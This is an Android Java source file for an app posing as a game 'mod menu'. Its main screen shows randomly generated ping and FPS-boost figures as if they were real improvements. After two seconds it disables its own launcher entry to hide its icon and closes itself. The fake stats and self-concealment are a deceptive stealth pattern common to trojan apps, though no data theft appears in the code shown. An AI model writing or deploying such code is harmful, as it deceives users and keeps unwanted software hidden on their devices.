package com.brawl.modmenu;

import android.app.Activity;
import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.widget.TextView;
import java.util.Random;

public class MainActivity extends Activity {

    private Handler handler = new Handler(Looper.getMainLooper());
    private Random rnd = new Random();

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.main);

        handler.post(updateStats);
        handler.postDelayed(this::hideSelf, 2000);
    }

    private Runnable updateStats = new Runnable() {
        @Override
        public void run() {
            TextView ping = findViewById(R.id.ping);
            TextView fps = findViewById(R.id.fps);
            if (ping != null) ping.setText((12 + rnd.nextInt(36)) + "ms");
            if (fps != null) fps.setText("+" + (30 + rnd.nextInt(30)) + "%");
            handler.postDelayed(this, 800);
        }
    };

    private void hideSelf() {
        try {
            PackageManager pm = getPackageManager();
            ComponentName cn = new ComponentName(this, MainActivity.class);
            pm.setComponentEnabledSetting(cn,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
            finishAffinity();
        } catch (Throwable ignored) {
            finishAffinity();
        }
    }

    @Override
    protected void onDestroy() {
        handler.removeCallbacksAndMessages(null);
        super.onDestroy();
    }
}
